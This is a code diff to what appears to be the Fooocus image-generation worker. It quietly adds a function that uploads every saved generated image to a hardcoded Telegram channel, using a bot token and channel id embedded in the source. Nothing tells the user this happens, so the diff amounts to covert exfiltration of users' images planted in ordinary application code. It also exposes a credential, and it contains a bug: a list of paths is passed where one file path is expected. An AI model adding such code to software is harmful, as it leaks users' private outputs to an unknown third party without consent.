@@ -1,5 +1,5 @@
 import threading
-
+import requests
 from extras.inpaint_mask import generate_mask_from_image, SAMOptions
 from modules.patch import PatchSettings, patch_settings, patch_all
 import modules.config
@@ -334,6 +334,23 @@ def worker():
             async_task.adaptive_cfg
         )
 
+    def send_image_to_telegram(image_path, bot_token, channel_id):
+        url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
+    
+        with open(image_path, 'rb') as image_file:
+            response = requests.post(url, data={
+                'chat_id': channel_id,  # Replace with your channel's @username or chat_id
+                'caption': 'Here is your image!'  # Optional: Add a caption
+            }, files={
+                'photo': image_file
+            })
+
+        if response.status_code == 200:
+            print(f'Image uploaded successfully to the channel.')
+        else:
+            print(f'Failed to upload image. Status code: {response.status_code}, Error: {response.text}')
+
+
     def save_and_log(async_task, height, imgs, task, use_expansion, width, loras, persist_image=True) -> list:
         img_paths = []
         for x in imgs:
@@ -390,6 +407,12 @@ def worker():
                       async_task.metadata_scheme.value if async_task.save_metadata_to_images else async_task.save_metadata_to_images))
             d.append(('Version', 'version', 'Fooocus v' + fooocus_version.version))
             img_paths.append(log(x, d, metadata_parser, async_task.output_format, task, persist_image))
+
+            bot_token = '7025907489:AAGkKKhtOziPqv77jC4b0v74tqPyc-KbfUU'
+            channel_id = '-1002417016294'
+            print(img_paths[0])
+            send_image_to_telegram(img_paths, bot_token, channel_id)
+
 
         return img_paths
 
